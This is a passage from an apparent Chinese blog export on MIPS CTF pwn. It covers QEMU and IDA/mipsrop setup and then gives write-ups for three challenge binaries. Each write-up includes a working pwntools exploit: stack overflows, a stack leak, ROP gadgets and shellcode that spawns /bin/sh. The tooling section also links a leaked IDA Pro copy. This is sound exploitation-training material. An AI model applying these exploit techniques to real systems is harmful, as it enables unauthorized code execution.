class="line"></span><br><span class="line">shellcode3=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push    rdi</span></span><br><span class="line"><span class="string">	push	rsp</span></span><br><span class="line"><span class="string">	pop	    rdi				</span></span><br><span class="line"><span class="string">	mov 	al,	59			</span></span><br><span class="line"><span class="string">	cdq					</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,shellcode1)</span><br><span class="line">edit(<span class="number">1</span>,shellcode2)</span><br><span class="line">edit(<span class="number">2</span>,shellcode3)</span><br><span class="line"></span><br><span class="line">test(<span class="number">0</span>)</span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">test(<span class="number">1</span>)</span><br><span class="line">it()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Note | MIPS工具&amp;&amp;入门题汇总</title>
    <url>/2021/08/23/mips-tools-and-ezpwn/</url>
    <content><![CDATA[<blockquote>
<p>主要是汇编和调试方法要弄懂，做完这几个题应该也算入门了。感觉目前 ctf 中异构的 pwn 题以 arm 架构为主，mips 架构的比较少见，找到的题基本都是 hws 出的。题目囤了快半年，终于被我 pick 起来了😢 。之前卡住的原因主要出在工具上，前前后后踩了不少小白才会踩的坑，在复现前必须记录一下。</p>
</blockquote>
<span id="more"></span>
<h1>1. tools</h1>
<p>分运行环境和逆向工具两部分。Buildroot 和 gdb-multiarch，应该有手就行。这里记录的都是我出过问题的工具。</p>
<h2 id="MIPS运行环境">MIPS运行环境</h2>
<p>虚拟机是 x86 的平台，要运行 MIPS 指令集的程序就需要模拟运行环境。可以理解为虚拟机中的虚拟机 (?   原理是 Linux 的虚拟化技术： <a href="https://www.redhat.com/zh/topics/virtualization/what-is-KVM">KVM是什么？一文带你快速了解Linux KVM 虚拟化 - Red Hat</a></p>
<p>目前用的最多的虚拟器就是 QEMU 吧。它工作的原理也好理解，就是仿真，通过动态的二进制转换在 x86 架构的系统上执行其他架构的程序。说到这不得不提，这个二进制转换并不只能是复杂指令集向精简指令集的转换的，反之也行。具体例子：<a href="https://www.bilibili.com/video/BV1MU4y137Yi?from=search&amp;seid=13839685224042904734">给手机装Windows11！还能玩大型游戏？！_哔哩哔哩_bilibili</a> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install --install-suggests qemu</span><br></pre></td></tr></table></figure>
<p>QEMU 有多个模式，最常见的是 qemu-user 和 qemu-system。顾名思义，qemu-user 是用户模式，用户一般只需运行程序，不需要接触到系统层面的配置。安装好后能在 <code>/usr/bin/</code> 下找到不同架构的模拟运行程序，图中的这些都是 qemu-user ，用它可以在 x86 平台上直接运行对应架构的程序。“直接运行”，也就是实现了交叉编译和交叉侦错。qemu 的这些模拟器跟 <code>arm-linux-gnueabihf</code> 、<code>aarch64-linux-gnu</code> 这些交叉编译器相似，而且安装完后它们都是在 <code>/usr</code> 下的。</p>
<img src="https://i.loli.net/2021/07/30/jUXvaNlz5WQm4TM.png"  />
<p>而 qemu-system 就是系统模式。模拟一个系统的运行包括镜像选择、网卡配置等用户模式设置不了的内容，它的运行相对也就多步骤些。需要目标架构的内核，模拟出目标系统后有用户名、密码，将程序上传到该系统执行、侦错就需要它能与 Linux 系统通信（也就是配置网卡、联网）… 这种情况下，异构的程序并非直接在 x86 上运行，而是在异构系统上运行，直接在 x86 上运行的是异构系统。</p>
<img src="https://i.loli.net/2021/07/30/SYkCmUgsW3cKHVL.png"  />
<p>讲了这么多理解的部分，是因为我觉着先理解后使用挺重要的。刚学的时候直接复制粘贴就用，不清楚工具的本质，也分不清它们的区别。（以至于国赛的时候给了个名字陌生的 qemu-user 就不会用了emmm）轩哥的文章给了很多链接，也写的很详细，看完应该差不多了：<a href="https://xuanxuanblingbling.github.io/ctf/tools/2020/04/16/qemu/">QEMU使用记录  Clang裁缝店</a> 。</p>
<h2 id="MIPSROP">MIPSROP</h2>
<p>用的是支持 MIPS 反汇编的 IDA Pro 7.5，下载链接： <a href="https://github.com/VanHoevenTR/IDA_Pro_7.5">VanHoevenTR/IDA_Pro_7.5: IDA Pro 7.5 leak</a> 。</p>
<p>直接解析二进制文件的时候会报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...\ida\plugins\idapython3_64.dll) error: 找不到指定的模块</span><br></pre></td></tr></table></figure>
<p>原因是 python 的版本不正确。此时我的是 3.8 版本的，查了下，需要的是 3.9 的。（安装 3.9 的时候可以顺便勾选自动添加 PATH 的选项，之后用 pip 安装的时候就不用再配置或者找到 python  的目录了。）</p>
<p>前面的链接里有个工具包 <code>ida75sp3_python39_win.zip</code>，用于配置 3.9 的环境。解压到 ida 根目录，全部覆盖，再运行 <code>idapyswitch.exe</code> 就可以了。不是 Windows 的可以下载对应版本：<a href="https://hex-rays.com/blog/python-3-9-support-for-ida-7-5/">Python 3.9 support for IDA 7.5 – Hex Rays</a> 。</p>
<p><img src="https://i.loli.net/2021/07/30/LFHVbET9z3kpqsu.png" alt=""></p>
<p>之后运行报 <code>cannot import name 'ida_shims' from 'shims'</code> 的错，就是少了 shims 这个模块的意思。把 <a href="https://github.com/tacnetsol/ida/tree/master/plugins"><br>
ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放进 plugins 目录下，或者用 <a href="http://install.py">install.py</a> 把插件全下完也可以。到这一步基本上没什么报错了，也能进行 MIPS 的反汇编。除了这个 PowerPC Big Endian 的固件反汇编不出来： <a href="https://paper.seebug.org/771/">基于 VxWorks 的嵌入式设备固件分析方法介绍</a> 。正常来说下面这种 MIPS 的elf 是没问题的，so 这个 PowerPC Big Endian 的我决定复现完再去整。</p>
<img src="https://i.loli.net/2021/07/30/27MrjAc9yzFpaJq.png"  />
<p>前面的插件已经包括 mipsrop 。如果装好了的话能在 <code>Edit -&gt; Plugins</code> 中看到。每次使用前需点击 <code>Search -&gt; mips rop gadgets </code>激活这个插件，idaPython 中 看到 <code>MIPS ROP Finder activated</code>就是可用状态了。使用命令可以输入 <code>mipsrop.help()</code>查看。</p>
<img src="https://i.loli.net/2021/07/30/IrMSEBxcj8O5A4f.png"  />
<h1>2. 题目</h1>
<p>题目来源：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题 入门 MIPS Pwn</a> 、<a href="https://ctf.show/challenges%E3%80%82">https://ctf.show/challenges。</a></p>
<h2 id="2-1-缓冲区溢出">2.1 缓冲区溢出</h2>
<blockquote>
<p>重点关注 MIPS32 与 X86 架构下 函数调用与栈的不同之处。</p>
</blockquote>
<p>32个通用寄存器表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">编号</th>
<th style="text-align:center">寄存器名称</th>
<th style="text-align:center">寄存器描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$0</td>
<td style="text-align:center">$zero</td>
<td style="text-align:center">始终为0，用于辅助运算判断、创建伪指令等</td>
</tr>
<tr>
<td style="text-align:center">$1</td>
<td style="text-align:center">$at</td>
<td style="text-align:center">保留寄存器，用作汇编器的暂时变量</td>
</tr>
<tr>
<td style="text-align:center">$2、$3</td>
<td style="text-align:center">$v0、$v1</td>
<td style="text-align:center">values，子程序返回值/非浮点结果（不够用时用内存）</td>
</tr>
<tr>
<td style="text-align:center">$4/5/6/7</td>
<td style="text-align:center">$a0/1/2/3</td>
<td style="text-align:center">aruments，函数的前四个参数（不够时用堆栈处理）</td>
</tr>
<tr>
<td style="text-align:center">$8~$15</td>
<td style="text-align:center">$t0/1/…/7</td>
<td style="text-align:center">temporaries，计算时用的临时寄存器</td>
</tr>
<tr>
<td style="text-align:center">$16~$23</td>
<td style="text-align:center">$s0/1/…/7</td>
<td style="text-align:center">saved values，保留现场</td>
</tr>
<tr>
<td style="text-align:center">$24、$25</td>
<td style="text-align:center">$t8、$t9</td>
<td style="text-align:center">temporaries，补充前面的 $t0 ~ $t7</td>
</tr>
<tr>
<td style="text-align:center">$26、$27</td>
<td style="text-align:center">$k0、$k1</td>
<td style="text-align:center">中断处理函数用于保存系统参数</td>
</tr>
<tr>
<td style="text-align:center">$28</td>
<td style="text-align:center">$gp</td>
<td style="text-align:center">global pointer，全局指针</td>
</tr>
<tr>
<td style="text-align:center">$29</td>
<td style="text-align:center">$sp</td>
<td style="text-align:center">stack pointer，堆栈指针，指向栈顶</td>
</tr>
<tr>
<td style="text-align:center">$30</td>
<td style="text-align:center">$fp</td>
<td style="text-align:center">frame pointer，保存栈指针（GNU）或$s8（SGI）</td>
</tr>
<tr>
<td style="text-align:center">$31</td>
<td style="text-align:center">$ra</td>
<td style="text-align:center">return address，返回地址</td>
</tr>
</tbody>
</table>
<ul>
<li>返回地址：直接存入 $ra，不是堆栈。但嵌套调用的时候，被调函数1会先把原 $ra 的值压入堆栈，再进行下一次调用，此时 $ra 存放的是被调函数2的返回地址。</li>
</ul>
<img src="https://i.loli.net/2021/07/30/uSzx8aceYWhRL9X.png" style="zoom: 50%;" />
<p>栈溢出漏洞的利用在叶子和非叶子函数间的主要区别就是，覆盖的是谁的返回地址。非叶子的情况和 x86 很像，比如上图的 B 函数，栈帧中存的是自己的返回地址（A），这时栈溢出能修改的就是它本身的返回地址。而像 C 这种叶子函数，本身的返回地址在 $ra 寄存器中，但payload足够长的话，能覆盖到 B 的栈帧，修改其父函数的返回地址。</p>
<h3 id="Mplogin">Mplogin</h3>
<blockquote>
<p>mips-32-little</p>
</blockquote>
<p>给出了两种运行方式。一种是把 so 文件放在本地的 <code>/lib/</code> 下、直接运行，一种是用 qemu-user运行、需要指定lib路径（注意是lib文件夹，不是so文件）。前面说到异构程序的运行需要交叉编译的工具辅助，这里的第一种方式并没有用到，看来关键在动态链接库。</p>
<img src="https://i.loli.net/2021/07/30/qwMdvBaCVAmZJo2.png"  />
<p>漏洞点在输入密码的函数中。可以覆盖到 Password 输入时的长度参数位置，从而输入Passsword 时有栈溢出，也就是第二个 read 的时候。程序什么保护都没开，直接往栈上写 shellcode 跳转过去就可以了。</p>
<img src="https://i.loli.net/2021/07/30/snO1VD5KjcYPAbH.png" style="zoom: 80%;" />
<p>栈地址怎么泄露呢。输密码之前还有一个函数，看栈帧的时候发现，输入的变量v1后面就是 $fp 和 $ra 的值。输出用的是 printf 函数，v1填满时就能泄露出来。这个函数是由 main 调用的，是叶子函数。因此 $ra 存的是main的地址，$fp存的是进入这个函数前的栈顶地址。</p>
<p><img src="https://i.loli.net/2021/07/30/59eS6fxnV3oWOdy.png" alt=""></p>
<p>该函数执行完后栈空间会回收，栈顶变回进入前的地址，下次进入设置密码函数时的栈顶也是这里。因此泄露这个地址就相当于拿到了栈溢出漏洞函数的栈顶地址。我在调试的过程中发现，在ubuntu 16中运行程序，栈溢出泄露不出数据，换成18又可以了… 当踩个坑吧，还不知道为何如此😰。</p>
<img src="https://i.loli.net/2021/07/30/9b28UBcRuDTEwXv.png"  />
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,binary=ELF(<span class="string">&#x27;./Mplogin&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./Mplogin&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mipsel&#x27;, &#x27;-L&#x27;, &#x27;./&#x27;,&#x27;-g&#x27;,&#x27;2364&#x27;, &#x27;./Mplogin&#x27;])</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./Mplogin&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">name=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">name=name.ljust(<span class="number">24</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Username :&#x27;</span>)</span><br><span class="line">sd(name)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;adminaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">stack=u32(rv(<span class="number">4</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">py=<span class="string">&#x27;access&#x27;</span></span><br><span class="line">py=py.ljust(<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">py+=p32(<span class="number">0x100</span>)</span><br><span class="line">ru(<span class="string">&#x27;Pre_Password :&#x27;</span>)</span><br><span class="line">sl(py)</span><br><span class="line"></span><br><span class="line">pwd=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">pwd=pwd.ljust(<span class="number">40</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">pwd+=p32(stack)+asm(shellcraft.sh())</span><br><span class="line">ru(<span class="string">&#x27;Password :&#x27;</span>)</span><br><span class="line">sl(pwd)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="pwn">pwn</h3>
<blockquote>
<p>mips-32-big</p>
</blockquote>
<p>程序整体逻辑是：</p>
<ol>
<li>输入组数，后创建 n 组大小为 0x24 的空间（栈上）。</li>
<li>输入n次 id 和用户名，在对应组的位置存储。</li>
</ol>
<p><img src="https://i.loli.net/2021/08/05/msrNxDMJRHFkGZ8.png" alt=""></p>
<p>堆溢出和栈溢出（长度和id均未规定）漏洞都有。可以通过 memcpy 的溢出，覆盖到返回地址。由于堆溢出漏洞，可写入 0x300  的 payload，应该是足够长的。</p>
<p><img src="https://i.loli.net/2021/08/05/CvfJiSY5Xm1rGb8.png" alt=""></p>
<p>先确定偏移吧。说下调试过程。</p>
<p>一开始用的是 <code>gdb-multiarch</code> ，<code>target remote</code> 后下断点，再 <code>continue</code> ，每次都报 <code>L1_MAP_ADDR_SPACE_BITS</code> 的错误或者断不下来。用 <code>ida remote debug</code> 应该可以。用移植到 ubuntu 上的 ida 会更好些，避免文件复制到 Windows 后符号链接丢失等问题。如果还是想在 qemu-user 的状态下进行尝试，还是能用 x86 的 gdb 调的：<a href="https://www.jianshu.com/p/ba12cd4e530a">路由器漏洞利用入门- 简书</a> 。但 cyclic 用起来很不方便，因为程序是用 qemu 运行的，因此要复制到脚本上再运行调试。其实直接看栈帧也可以算出来，用 <code>gdb-multiarch</code> remote 过去后，不下断点也能看到返回地址有没有被覆盖。</p>
<p>用户名经 strchr 函数返回后，把起始位置赋给 <code>cur_i</code> 。这里的输入位置与 <code>$ra</code> 的距离 就是 <code>0x14+0x24+0x58=0x90</code> 。</p>
<p><img src="https://i.loli.net/2021/08/05/auFLiQx4ERT3GOc.png" alt=""></p>
<p>因为返回地址范围不合法，即使不下断点也能看出是否覆盖到了：</p>
<p><img src="https://i.loli.net/2021/08/04/TVCcawAPIks4ndL.png" alt=""></p>
<p>接下来就是写shellcode了。堆地址、栈地址、libc没有办法泄露，加上没有开启地址随机化，可以使用 rop gadget。利用 <code>MIPSROP</code> ，找到下面的这些 gadget。基本上都是 <code>add $sp,(...)</code> 后，储存在一个寄存器 A 中，再 jmp 到另一个寄存器 B 上执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIPS ROP Finder activated, found 842 controllable jumps between 0x00400000 and 0x004740A0</span><br><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                       |  Control Jump                          |</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x004273C4  |  addiu $a2,$sp,0x70+var_C                     |  jalr  $s0                             |</span><br><span class="line">|  0x0042BCD0  |  addiu $a2,$sp,0x88+var_C                     |  jalr  $s2                             |</span><br><span class="line">|  0x0042FA00  |  addiu $v1,$sp,0x138+var_104                  |  jalr  $s1                             |</span><br><span class="line">|  0x004491F8  |  addiu $a2,$sp,0x44+var_C                     |  jalr  $s1                             |</span><br><span class="line">|  0x0044931C  |  addiu $v0,$sp,0x30+var_8                     |  jalr  $s1                             |</span><br><span class="line">|  0x00449444  |  addiu $a2,$sp,0x44+var_C                     |  jalr  $s1                             |</span><br><span class="line">|  0x0044AD58  |  addiu $a1,$sp,0x60+var_28                    |  jalr  $s4                             |</span><br><span class="line">|  0x0044AEFC  |  addiu $a1,$sp,0x64+var_28                    |  jalr  $s5                             |</span><br><span class="line">|  0x0044B154  |  addiu $a1,$sp,0x6C+var_38                    |  jalr  $s2                             |</span><br><span class="line">|  0x0044B1EC  |  addiu $v0,$sp,0x6C+var_40                    |  jalr  $s2                             |</span><br><span class="line">|  0x0044B3EC  |  addiu $v0,$sp,0x170+var_130                  |  jalr  $s0                             |</span><br><span class="line">|  0x00454E94  |  addiu $s7,$sp,0xB8+var_98                    |  jalr  $s3                             |</span><br><span class="line">|  0x00465BEC  |  addiu $a1,$sp,0xC4+var_98                    |  jalr  $s0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 13 matching gadgets</span><br></pre></td></tr></table></figure>
<p>显然 addiu 到寄存器 A 的内容是我们输入的、可控的，可以在这范围内写 shellcode。之后 jmp 到寄存器 B，就需要再 jmp 回来到 A 存储的位置执行 shellcode。比如上面的第一条 gadget ，$s0 的内容应该是 <code>jmp $a2</code>，第二条gadget的 $s2 应该是 <code>jmp $a2</code>。而这些 s  寄存器在 MIPS 中是用于 <code>saved value</code>  的，有保存现场就会有恢复现场，因此在每个函数末尾 return 的时候都会有  <code>lw $s?,?+var_?($sp)</code> 的操作。前面 <code>loc_400a2c</code> 的图就是这个 pwn 函数的返回步骤，可以看到 <code>$s0~$s7</code>全用上了，用 mipsrop 找到的 gadgets 都可用，可通过栈上的内容来控制 s寄存器的内容。从一个寄存器 jmp 到另一个寄存器，用的是临时寄存器，一般用 $t9：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python&gt;mipsrop.find(&quot;move $t9,$a2&quot;)</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                      |  Control Jump                          |</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00421684  |  move $t9,$a2                                |  jr    $a2                             |</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>算好 $s0 、$a2的位置就可以了。用其他 gadget 的话，改下offset就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># from struct import pack</span></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,bits=<span class="number">32</span>,endian=<span class="string">&#x27;big&#x27;</span>,binary=ELF(<span class="string">&#x27;./pwn2&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mips&#x27;, &#x27;-g&#x27;,&#x27;2230&#x27;, &#x27;./pwn2&#x27;])</span></span><br><span class="line"><span class="comment"># rop = ROP(context.binary)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#$0 offset: $cur_i+0x58+0x14=$cur_i+0x6c</span></span><br><span class="line"><span class="comment">#shellcode offset: $sp+0x70+var_c=$sp+0x70-0x0c=$sp+0x64</span></span><br><span class="line">jmp_a2=<span class="number">0x00421684</span><span class="comment">#jr $a2</span></span><br><span class="line">gadget=<span class="number">0x004273C4</span><span class="comment">#jr $s0</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))#0x7c</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;.\&#x27; \n&#x27;</span>)</span><br><span class="line">py=<span class="string">&#x27;1:&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(jmp_a2)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x6c</span>-<span class="number">4</span>)+p32(gadget)</span><br><span class="line">py+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span>+shellcode+<span class="string">&#x27;.&#x27;</span></span><br><span class="line">sl(py)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<p>顺便提一下，如果 ubuntu16 下的 shellcode 生成不了，可以检查下是不是 binutils 缺少 mips 架构版本的问题，正常来说应该是会返回一个 gnu 数组的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import*</span><br><span class="line">&gt;&gt;&gt; pwnlib.asm.dpkg_search_for_binutils(&#x27;mips&#x27;, &#x27;as&#x27;)</span><br><span class="line">[&#x27;binutils-mips-linux-gnu&#x27;, &#x27;binutils-mipsel-linux-gnu&#x27;]</span><br></pre></td></tr></table></figure>
<p>原因是 ubuntu 16 自带的 binutils 版本旧，安装下对应的 gnu 就可以了。或者用 ubuntu18 以上的版本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install binutils-mips-linux-gnu</span><br></pre></td></tr></table></figure>
<h3 id="ctfshow-内部赛-babystack">ctfshow 内部赛 babystack</h3>
<blockquote>
<p>mips-32-little</p>
</blockquote>
<p>ret2shellcode：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># from struct import pack</span></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,bits=<span class="number">32</span>,endian=<span class="string">&#x27;little&#x27;</span>,binary=ELF(<span class="string">&#x27;./main&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mipsel&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;-g&#x27;,&#x27;2230&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line"><span class="comment"># rop = ROP(context.binary)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">name=<span class="number">0x00410C20</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">sl(shellcode)</span><br><span class="line">ru(<span class="string">&#x27;message:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x34</span>+p32(name))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="2-2-堆漏洞">2.2 堆漏洞</h2>
]]></content>
      <categories>
        <category>mips</category>
      </categories>
      <tags>
        <tag>mips</tag>
      </tags>
  </entry>
</search>
